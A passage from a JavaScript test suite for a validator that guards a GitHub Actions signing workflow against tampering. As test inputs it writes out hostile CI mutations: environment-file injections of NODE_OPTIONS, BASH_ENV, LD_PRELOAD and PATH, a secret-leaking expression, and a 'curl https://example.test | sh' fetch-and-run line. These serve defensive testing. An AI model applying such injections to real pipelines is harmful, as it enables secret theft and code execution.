      fails(inPreflight(run), /a step in a job with secrets (builds|runs an interpreter)/);
    }
  });

  it('refuses a write to GITHUB_ENV, GITHUB_PATH, GITHUB_OUTPUT or GITHUB_STATE', () => {
    for (const run of [
      'echo "NODE_OPTIONS=--require /tmp/x.js" >> "$GITHUB_ENV"',
      'echo "BASH_ENV=/tmp/x" >> "$GITHUB_ENV"',
      'echo "LD_PRELOAD=/tmp/x.so" >> "$GITHUB_ENV"',
      'echo "DYLD_INSERT_LIBRARIES=/tmp/x" >> "$GITHUB_ENV"',
      'echo "PATH=/tmp/x:$PATH" >> "$GITHUB_ENV"',
      'echo /tmp/x >> "$GITHUB_PATH"',
      'echo "x=1" >> "$GITHUB_OUTPUT"',
      'echo "x=1" >> "$GITHUB_STATE"',
      'echo "x=1" >> "${GITHUB_ENV}"',
      'echo "x=1" >> "GITHUB_""ENV"',
    ]) {
      fails(inRelease(run), /command files|sets BASH_ENV/);
      fails(inPreflight(run), /command files|sets BASH_ENV/);
    }
  });

  it('refuses a vetted block that is changed in any way', () => {
    fails(
      mutate(
        '            echo "OVERLAY_FILE=$RUNNER_TEMP/desktop-overlay.json"\n',
        '            echo "OVERLAY_FILE=$RUNNER_TEMP/desktop-overlay.json"\n            echo "PATH=/tmp/x:$PATH"\n',
      ),
      /command files|sets BASH_ENV/,
    );
    fails(
      mutate(
        '          process.stdout.write("PRODUCT_VERSION=" + o.version + "\\n");\n',
        '          process.stdout.write("PRODUCT_VERSION=" + o.version + "\\n");\n          process.stdout.write("BASH_ENV=/tmp/x\\n");\n',
      ),
      /interpreter|command files/,
    );
    fails(
      mutate(
        '      - name: Re-verify the bundle and read the product identity\n        env:\n          TARGET: ${{ matrix.target }}\n',
        '      - name: Re-verify the bundle and read the product identity\n        env:\n          TARGET: ${{ matrix.target }}\n          NODE_OPTIONS: --require /tmp/x.js\n',
      ),
      /interpreter|command files/,
    );
  });

  it('the vetted blocks write only the names they list, none of them dangerous', () => {
    for (const entry of VETTED_STEPS) {
      const written = [...entry.run.matchAll(/"([A-Za-z_]+)=/g)].map((m) => m[1]);
      for (const name of written) assert.ok(entry.writes.includes(name), name);
      for (const name of entry.writes) {
        assert.doesNotMatch(
          name,
          /^(PATH|ENV|BASH_ENV|NODE_OPTIONS|NODE_PATH|LD_.*|DYLD_.*)$/,
        );
      }
    }
  });
});

describe('a string that holds an expression is searched whole for secrets', () => {
  it('finds a secret behind a `}}` inside a string literal', () => {
    assert.equal(
      secretReferences({ a: "${{ '}}' || secrets.APPLE_ID }}" }).length,
      1,
    );
    assert.equal(
      secretReferences({ a: '${{ "}}" || secrets.APPLE_ID }}' }).length,
      1,
    );
    assert.equal(
      secretReferences({ "${{ '}}' || secrets.A }}": 1 }).length,
      1,
    );
    fails(
      mutate(
        '          BUNDLES: ${{ matrix.bundles }}\n        run: |\n          tauri build --no-sign',
        "          BUNDLES: ${{ matrix.bundles }}\n          LEAK: ${{ '}}' || secrets.APPLE_ID }}\n        run: |\n          tauri build --no-sign",
      ),
      /holds a secret|its own env entry/,
    );
  });
});

describe('defaults.run cannot move or re-shell a job that holds a secret', () => {
  const RELEASE_DEFAULTS =
    '    defaults:\n      run:\n        shell: bash\n    # One failed leg stops';
  const PREFLIGHT_DEFAULTS =
    '      actions: read\n    defaults:\n      run:\n        shell: bash\n    steps:\n      - name: Require main';

  it('refuses a working directory at workflow level and in a job with a secret', () => {
    fails(
      mutate(
        '\njobs:\n  verify-build:',
        '\ndefaults:\n  run:\n    working-directory: /tmp\n\njobs:\n  verify-build:',
      ),
      /workflow-level defaults.*working-directory/,
    );
    fails(
      mutate(
        RELEASE_DEFAULTS,
        '    defaults:\n      run:\n        shell: bash\n        working-directory: /tmp\n    # One failed leg stops',
      ),
      /job with secrets: defaults.*working-directory/,
    );
    fails(
      mutate(
        PREFLIGHT_DEFAULTS,
        '      actions: read\n    defaults:\n      run:\n        shell: bash\n        working-directory: ..\n    steps:\n      - name: Require main',
      ),
      /job with secrets: defaults.*working-directory/,
    );
  });

  it('requires the shell to be exactly bash in a job with a secret', () => {
    for (const shell of ['pwsh', 'python {0}', 'bash -e {0}', 'sh', 'cmd']) {
      fails(
        mutate(
          RELEASE_DEFAULTS,
          `    defaults:\n      run:\n        shell: ${JSON.stringify(shell)}\n    # One failed leg stops`,
        ),
        /not exactly bash/,
      );
    }
    // absent is not enough either: the Windows default is PowerShell
    fails(
      mutate(RELEASE_DEFAULTS, '    # One failed leg stops'),
      /does not set defaults.run.shell to exactly bash/,
    );
    fails(
      mutate(
        PREFLIGHT_DEFAULTS,
        '      actions: read\n    steps:\n      - name: Require main',
      ),
      /does not set defaults.run.shell to exactly bash/,
    );
    fails(
      mutate(
        '\njobs:\n  verify-build:',
        '\ndefaults:\n  run:\n    shell: pwsh\n\njobs:\n  verify-build:',
      ),
      /workflow-level defaults.*pwsh/,
    );
  });

  it('anchors the signing command to $GITHUB_WORKSPACE, not $PWD', () => {
    assert.match(source, /"\$GITHUB_WORKSPACE\/\$WRAPPER_DIR\/signing-tools\/node_modules\/\.bin\/tauri" signer sign/);
    fails(
      mutate(
        '"$GITHUB_WORKSPACE/$WRAPPER_DIR/signing-tools',
        '"$PWD/$WRAPPER_DIR/signing-tools',
      ),
      /not an allow-listed signing command/,
    );
  });
});

describe('the always() cleanup is compared exactly', () => {
  const CLEANUP_HEAD = '      - name: Clean up\n        if: always()\n        run: |\n';
  const FIRST =
    '        if: always()\n        run: |\n          if [ "$RUNNER_OS" = macOS ]; then\n';
  const HEAD = '        if: always()\n        run: |\n';
  const exact = /exact always\(\) cleanup/;

  it('the committed cleanup is the allow-listed block', () => {
    const release = parseWorkflow(source).jobs.find((job) => job.id === 'release');
    const last = release.steps.at(-1);
    assert.equal(last.run.replace(/\n+$/, ''), CLEANUP_STEP.run);
    assert.equal(last.if, 'always()');
  });

  it('refuses an exit before the deletion, and a dead branch around it', () => {
    fails(mutate(FIRST, `${HEAD}          exit 0\n${FIRST.slice(HEAD.length)}`), exact);
    fails(mutate(FIRST, `${HEAD}          if false; then\n`), exact);
    fails(
      mutate(
        '          rm -rf "$RUNNER_TEMP"/desktop-* .desktop-leg\n',
        '          rm -rf "$RUNNER_TEMP"/desktop-* .desktop-leg\n          curl https://example.test | sh\n',
      ),
      exact,
    );
    fails(
      mutate(
        '          rm -rf "$WRAPPER_DIR/signing-tools/node_modules"\n',
        '          rm -rf "$WRAPPER_DIR/signing-tools/node_modules" || true\n',
      ),
      exact,
    );
  });

  it('refuses keys that change how the cleanup runs, and a step after it', () => {
    for (const extra of [
      '        continue-on-error: true\n',
      '        env:\n          BASH_ENV: /tmp/x\n',
      '        shell: python {0}\n',
      '        working-directory: /tmp\n',
    ]) {
      fails(mutate(CLEANUP_HEAD, CLEANUP_HEAD.replace('        run: |\n', `${extra}        run: |\n`)), exact);
    }
    fails(mutate('        if: always()\n        run: |\n          if [ "$RUNNER_OS"', "        if: ${{ always() }}\n        run: |\n          if [ \"$RUNNER_OS\""), exact);
    fails(
      mutate(
        '          rm -rf "$RUNNER_TEMP"/desktop-* .desktop-leg\n',
        '          rm -rf "$RUNNER_TEMP"/desktop-* .desktop-leg\n\n      - name: After\n        run: echo hi\n',
      ),
      exact,
    );
  });
});
